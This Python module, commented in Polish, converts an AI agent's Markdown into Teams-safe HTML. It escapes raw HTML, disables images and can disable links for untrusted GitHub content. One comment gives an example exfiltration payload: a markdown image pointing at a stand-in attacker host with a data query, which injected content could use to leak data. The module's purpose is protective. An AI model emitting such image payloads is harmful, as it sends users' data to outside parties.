"""Render Markdown → HTML dla drzwi Teams (delegowany) — kierunek WYJŚCIOWY.

Model agenta emituje Markdown (``**pogrubienie**``, ``### nagłówek``, listy). Graph
przy odpowiedzi na kanale przyjmuje ``contentType: "html"``, więc TU zamieniamy Markdown
na podzbiór HTML renderowany przez Teams (``<strong>``/``<em>``, ``<ul>/<ol>/<li>``,
``<h1>``–``<h6>``, ``<pre>/<code>``, ``<a>``, ``<blockquote>``, ``<p>``, ``<br>``).
Dopełnia ``selection._strip_html`` (kierunek WEJŚCIOWY, zdejmowanie HTML z wiadomości
przychodzących) o render w kierunku WYJŚCIOWYM.

Biblioteka ``markdown-it-py`` (extra ``teams-graph``) importowana LENIWIE — sam import
tego modułu nie wymaga extra. Każdy błąd renderu (w tym brak biblioteki) DEGRADUJE do
zescapowanego tekstu (filozofia ADR 0016: egress nigdy nie kładzie pollera).
"""
from __future__ import annotations

import html
import logging

logger = logging.getLogger(__name__)


def to_teams_html(markdown_text: str, *, allow_links: bool = True) -> str:
    """Zamień Markdown agenta na HTML renderowany przez Teams; degraduj przy błędzie.

    ``allow_links`` — czy renderować markdownowe linki ``[tekst](url)``. Domyślnie ``True`` (wyjście
    AGENTA jest zaufane). Dla powiadomień MOSTU (treść zdarzeń z GitHuba, niezaufana) ustawiamy
    ``False``: ``[Kliknij](https://atakujący)`` w tytule issue nie może stać się żywym linkiem
    (phishing) — schodzi jako tekst, a prawdziwy odnośnik i tak jest w wiadomości osobno.
    """
    try:
        from markdown_it import MarkdownIt
    except Exception:  # brak extra teams-graph albo błąd ładowania — nie wywracaj wysyłki
        logger.warning(
            "markdown-it-py niedostępny — wysyłam tekst zescapowany, bez formatowania."
        )
        return _escape_fallback(markdown_text)

    try:
        # html=False: surowy HTML w treści modelu to DANE — escapujemy, nie przepuszczamy.
        # Preset commonmark nie włącza tabel: Teams renderuje <table> niekonsekwentnie,
        # więc md-tabele schodzą jako tekst (świadomy kompromis).
        renderer = MarkdownIt("commonmark", {"html": False})
        # Wyłącz obrazki: treść notatek/wiadomości to niezaufane DANE, a wstrzyknięty
        # `![](https://atakujący/?d=...)` stałby się żywym <img src> — Teams mógłby go
        # pobrać, wyprowadzając dane. Markdown obrazka schodzi jako tekst (jak tabele).
        renderer.disable("image")
        if not allow_links:
            renderer.disable("link")  # niezaufana treść mostu — linki jako tekst (anty-phishing)
        return renderer.render(markdown_text)
    except Exception:  # renderer nie powinien rzucać, ale egress musi być odporny
        logger.exception("Render Markdown→HTML nie powiódł się — degraduję do tekstu.")
        return _escape_fallback(markdown_text)


def _escape_fallback(text: str) -> str:
    """Bezpieczny plain text jako HTML: zescapuj znaki i zamień nowe linie na ``<br>``."""
    return html.escape(text).replace("\n", "<br>")
